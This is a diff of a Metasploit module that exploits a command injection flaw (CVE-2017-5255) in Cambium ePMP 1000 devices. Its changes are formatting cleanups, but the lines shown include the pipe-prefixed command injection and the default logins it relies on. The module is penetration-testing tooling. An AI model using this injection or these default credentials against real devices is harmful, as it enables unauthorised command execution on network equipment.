@@ -7,25 +7,25 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::EPMP
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => "Cambium ePMP 1000 'get_chart' Command Injection (v3.1-3.5-RC7)",
-      'Description' => %{
+    super(
+      update_info(
+        info,
+        'Name' => "Cambium ePMP 1000 'get_chart' Command Injection (v3.1-3.5-RC7)",
+        'Description' => %q{
           This module exploits an OS Command Injection vulnerability in Cambium
           ePMP 1000 (v3.1-3.5-RC7) device management portal. It requires any one of the
           following login credentials - admin/admin, installer/installer, home/home - to
           execute arbitrary system commands.
-      },
-      'Author' =>
-        [
+        },
+        'Author' => [
           'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
         ],
-      'References' =>
-        [
+        'References' => [
           ['CVE', '2017-5255'],
           ['URL', 'https://www.rapid7.com/blog/post/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities/']
         ],
-      'License' => MSF_LICENSE
-     )
+        'License' => MSF_LICENSE
+      )
     )
 
     register_options(
@@ -40,7 +40,7 @@ class MetasploitModule < Msf::Auxiliary
     deregister_options('DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASS_FILE', 'BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'STOP_ON_SUCCESS')
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     unless is_app_epmp1000?
       return
     end
@@ -49,7 +49,7 @@ class MetasploitModule < Msf::Auxiliary
   # Command Execution
   def cmd_exec(config_uri, cookie)
     command = datastore['CMD']
-    inject = '|' + "#{command}"
+    inject = '|' + command.to_s
     clean_inject = CGI.unescapeHTML(inject.to_s)
 
     print_status("#{rhost}:#{rport} - Executing #{command}")
@@ -74,10 +74,9 @@ class MetasploitModule < Msf::Auxiliary
       }, 25
     )
 
-    good_response = (
+    good_response =
       res &&
       res.code == 200
-    )
 
     if good_response
       path = store_loot('ePMP_cmd_exec', 'text/plain', rhost, res.body, 'Cambium ePMP 1000 Command Exec Results')
@@ -92,10 +91,10 @@ class MetasploitModule < Msf::Auxiliary
   #
 
   def do_login(epmp_ver)
-    if (epmp_ver < '3.1' || epmp_ver > '3.5' && epmp_ver != '3.5-RC7')
+    if epmp_ver < '3.1' || epmp_ver > '3.5' && epmp_ver != '3.5-RC7'
       print_error('This module is applicable to versions 3.1-3.5-RC7 only. Exiting now.')
       return
-    elsif (epmp_ver >= '3.1' && epmp_ver < '3.4.1') # <3.4.1 uses login_1
+    elsif epmp_ver >= '3.1' && epmp_ver < '3.4.1' # <3.4.1 uses login_1
       cookie, _blah1, _blah2, config_uri_get_chart = login_1(datastore['USERNAME'], datastore['PASSWORD'], epmp_ver)
       if cookie == 'skip' && config_uri_get_chart == 'skip'
         return
